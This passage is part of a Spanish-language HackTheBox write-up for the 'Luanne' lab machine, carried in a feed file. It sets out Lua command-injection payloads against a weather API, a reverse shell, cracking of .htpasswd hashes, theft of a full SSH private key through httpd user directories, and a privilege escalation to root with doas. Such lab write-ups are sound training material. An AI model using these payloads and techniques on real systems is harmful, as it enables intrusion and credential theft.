-&lt;p&gt;En principio, la inyección parece fallar, pero vamos a volver a enviarlo esta vez haciendo &lt;code&gt;urlencode&lt;/code&gt; y esta vez si vemos la ejecución correctamente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente que haremos sera entablarnos una &lt;code&gt;revershell&lt;/code&gt; a nuestra maquina usando &lt;code&gt;mkfifo&lt;/code&gt; para que si tenemos una versión distinta de &lt;code&gt;ncat&lt;/code&gt; evitar inconenientes, para ello podemos usar la pagina web de confianza de &lt;code&gt;pentestmonkey&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Enviamos la petición, modificando nuestra ip, puerto en escucha y sin olvidar urlencodear la petición.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y recibimos la conexión en nuestra maquina como el usuario &lt;code&gt;httpd&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.218.
-Ncat: Connection from 10.10.10.218:65479.
-sh: can't access tty; job control turned off
-$ whoami
-_httpd
-$ hostname
-luanne.htb
-$ uname -a  
-NetBSD luanne.htb 9.0 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020  mkrepro@mkrepro.NetBSD.org:/usr/src/sys/arch/amd64/compile/GENERIC amd64
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Y vemos que si se corresponde a un &lt;code&gt;NetBSD&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a lista los procesos que se estan ejecutando en la maquina y obervamos una correspondiente al demonio de &lt;code&gt;httpd&lt;/code&gt;, por el puerto &lt;code&gt;3001&lt;/code&gt; que apunta a la ruta &lt;code&gt;weather&lt;/code&gt;similar a la que usamos para ganar acceso al sistema.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'&quot;
-Enter host password for user '-X':
-
-HTTP/1.1 500 Error
-Content-Type: application/json
-
-&amp;lt;br&amp;gt;Lua error: /usr/local/webapi/weather.lua:49: attempt to call a nil value
-
-curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22id%22%29--%2B-&quot;
-Enter host password for user '-X':
-
-HTTP/1.1 500 Error
-Content-Type: application/json
-
-{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
-curl -u -X -s -i &quot;http://127.0.0.1:3000/weather/forecast?city=list'%29%3B+os.execute%28%22whoami%22%29--%2B-&quot;
-Enter host password for user '-X':
-
-HTTP/1.1 500 Error
-Content-Type: application/json
-
-{&quot;code&quot;: 500,&quot;error&quot;: &quot;unknown city: list_httpd
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Observamos que tambien podemos ejecutar comandos, pero como el mismo usuario, asi que no nos serviria hacerlo. Pero vemos que en la ejecución del comando incorpora distintos parametros y podemos ver a que corresponde en &lt;code&gt;NETBSD&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Encontramos un articulo que nos explica a detalle el funcionamiento de los parametros.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&quot;&gt;https://man.netbsd.org/NetBSD-9.3/i386/httpd.8&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Entre los parametros que se utiliza en la petición, podemos ver que &lt;code&gt;-u&lt;/code&gt;, permite la transformación de localizadores uniformes de recursos de la forma &lt;code&gt;/~user/&lt;/code&gt; en el directorio &lt;code&gt;~user/public_html&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora podemos aprovecharnos de esto, para lista los recursos del directorio &lt;code&gt;r.michaels&lt;/code&gt;, pero como realiza una autenticación, necesitamos credenciales y si listamos los archivos ocultos de nuestro directorio actual, podemos ver un archivo de nombre &lt;code&gt;.htpasswd&lt;/code&gt; que al leerlo se nos reporta un usuario con una contraeña hasheada que podemos intentar crackerla con &lt;code&gt;john&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ls -la
-total 20
-drwxr-xr-x   2 root  wheel  512 Nov 25  2020 .
-drwxr-xr-x  24 root  wheel  512 Nov 24  2020 ..
--rw-r--r--   1 root  wheel   47 Sep 16  2020 .htpasswd
--rw-r--r--   1 root  wheel  386 Sep 17  2020 index.html
--rw-r--r--   1 root  wheel   78 Nov 25  2020 robots.txt
-cat .htpasswd
-webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de realizar el crackeo &lt;code&gt;john&lt;/code&gt;, nos reporta la contraseña en texto claro, asi que ahora que contamos con credenciales validar &lt;code&gt;webapi_user:iamthebest&lt;/code&gt;, podemos usarlas en la petición.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/&quot; -u 'webapi_user:iamthebest'
-&amp;lt;!DOCTYPE html&amp;gt;
-&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;/&amp;gt;
-&amp;lt;style type=&quot;text/css&quot;&amp;gt;
-table {
-	border-top: 1px solid black;
-	border-bottom: 1px solid black;
-}
-th { background: aquamarine; }
-tr:nth-child(even) { background: lavender; }
-&amp;lt;/style&amp;gt;
-&amp;lt;title&amp;gt;Index of ~r.michaels/&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
-&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Index of ~r.michaels/&amp;lt;/h1&amp;gt;
-&amp;lt;table cols=3&amp;gt;
-&amp;lt;thead&amp;gt;
-&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Name&amp;lt;th&amp;gt;Last modified&amp;lt;th align=right&amp;gt;Size
-&amp;lt;tbody&amp;gt;
-&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;../&quot;&amp;gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 18:20&amp;lt;td align=right&amp;gt;1kB
-&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;id_rsa&quot;&amp;gt;id_rsa&amp;lt;/a&amp;gt;&amp;lt;td&amp;gt;16-Sep-2020 16:52&amp;lt;td align=right&amp;gt;3kB
-&amp;lt;/table&amp;gt;
-&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Esta vez podemos listar el contenido del usuario &lt;code&gt;r.michaels&lt;/code&gt; y dentro vemos su &lt;code&gt;id_rsa&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Ahora tal y como nos dice el articulo de &lt;code&gt;NETBSD&lt;/code&gt;, podemos hacer uso del paramtro &lt;code&gt;-G&lt;/code&gt; para ver el output.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl -s -X GET &quot;http://127.0.0.1:3001/~r.michaels/id_rsa&quot; -u 'webapi_user:iamthebest' -G id_rsa
------BEGIN OPENSSH PRIVATE KEY-----
-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
------END OPENSSH PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ya con la &lt;code&gt;id_rsa&lt;/code&gt; al estar abierto el puerto &lt;code&gt;22&lt;/code&gt;, podemos conectarnos como &lt;code&gt;r.michaels&lt;/code&gt;, sin proporcionar contraseña.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nvim id_rsa
-❯ chmod 600 id_rsa
-❯ ssh -i id_rsa r.michaels@10.10.10.218
-The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
-ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
-Last login: Fri Sep 18 07:06:51 2020
-NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
-
-Welcome to NetBSD!
-
-luanne$ whoami
-r.michaels
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Visualizamos los archivos, del directorio y podemos leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;backups     devel       public_html user.txt
-luanne$ cat user.txt                                                                                                                                                                  
-ea5f0ce6a917b0be1eabc7f9218febc0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Si listamos el directorio del usuario, obsevamos un directorio &lt;code&gt;backup&lt;/code&gt;, que dentro contiene un archivo tar encrpytado.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ ls
-backups     devel       public_html user.txt
-luanne$ cd backups/                                                                                                                                                                   
-luanne$ ls 
-devel_backup-2020-09-16.tar.gz.enc
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora en &lt;code&gt;NETBSD&lt;/code&gt;, existe una herramienta para decsencriptar estos archivos que corresponde ah &lt;code&gt;netpgp&lt;/code&gt;. Si ejecutamos la herramienta nos muestra el panel de ayuda para poder ejecutarla correctamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ netpgp
-NetPGP portable 3.99.17/[20101103]
-All bug reports, praise and chocolate, please, to:
-Alistair Crooks &amp;lt;agc@netbsd.org&amp;gt; c0596823
-Usage: netpgp COMMAND OPTIONS:
-netpgp  --help OR
-        --encrypt [--output=file] [options] files... OR
-        --decrypt [--output=file] [options] files... OR
-
-        --sign [--armor] [--detach] [--hash=alg] [--output=file]
-                [options] files... OR
-        --verify [options] files... OR
-        --cat [--output=file] [options] files... OR
-        --clearsign [--output=file] [options] files... OR
-        --list-packets [options] OR
-        --version
-where options are:
-        [--cipher=&amp;lt;ciphername&amp;gt;] AND/OR
-        [--coredumps] AND/OR
-        [--homedir=&amp;lt;homedir&amp;gt;] AND/OR
-        [--keyring=&amp;lt;keyring&amp;gt;] AND/OR
-        [--numtries=&amp;lt;attempts&amp;gt;] AND/OR
-        [--userid=&amp;lt;userid&amp;gt;] AND/OR
-        [--maxmemalloc=&amp;lt;number of bytes&amp;gt;] AND/OR
-        [--verbose]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Despues de decsencriptar el archivo, vamos a traernoslo a nuestro equipo para descromprimirlo, como no cuenta con &lt;code&gt;python&lt;/code&gt;, usaremos &lt;code&gt;nc&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo descomprimimos y dentro vemos otro archivo &lt;code&gt;.htpasswd&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
- devel_backup-2020-09-16.tar.gz   id_rsa
-❯ file devel_backup-2020-09-16.tar.gz
-devel_backup-2020-09-16.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
-❯ tar -xf devel_backup-2020-09-16.tar.gz
-❯ ls
- devel-2020-09-16   devel_backup-2020-09-16.tar.gz   id_rsa
-❯ cd devel-2020-09-16
-❯ ls
- webapi   www
-❯ tree -fas
-.
-├── [         22]  ./webapi
-│   └── [       7072]  ./webapi/weather.lua
-└── [         38]  ./www
-    ├── [         47]  ./www/.htpasswd
-    └── [        378]  ./www/index.html
-
-2 directories, 3 files
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Al leer el archivo, vemos una contraeña &lt;code&gt;hasheada&lt;/code&gt;, pero que es distinta a la obtuvimos previamente. Asi con john vamos a intentar crackear este otro &lt;code&gt;hash&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
-Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
-Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
-Using default input encoding: UTF-8
-Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-littlebear       (webapi_user)
-1g 0:00:00:00 DONE (2023-06-29 18:21) 7.142g/s 93257p/s 93257c/s 93257C/s gamboa..hello11
-Use the &quot;--show&quot; option to display all of the cracked passwords reliably
-Session completed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Obtenemos una nueva contraseña &lt;code&gt;littlebear&lt;/code&gt;, que curiosamente corresponde a la del usuario &lt;code&gt;root&lt;/code&gt;, pero para migrar no podemos hacer uso de &lt;code&gt;su root&lt;/code&gt;, ya que en &lt;code&gt;NETBSD&lt;/code&gt; lo hacemos usando el comando &lt;code&gt;doas&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ su root 
-su: You are not listed in the correct secondary group (wheel) to su root.
-su: Sorry: Authentication error
-luanne$ doas sh
-Password:
-# whoami
-root
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Finalmente solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; y asi habriamos concluido.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# cd /root
-# cat root.txt
-7a9b5c206e8e8ba09bb99bd113675f66
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Thu, 29 Jun 2023 00:00:00 -0500</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Luanne</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Luanne</guid>
-        
-        <category>NETBSD</category>
-        
-        <category>Api json explotation</category>
-        
-        <category>Lua Command Injection</category>
-        
-        <category>Abussing httpd Parameter</category>
-        
-        <category>Cracking Hashes</category>
         
         
         <category>hackthebox</category>
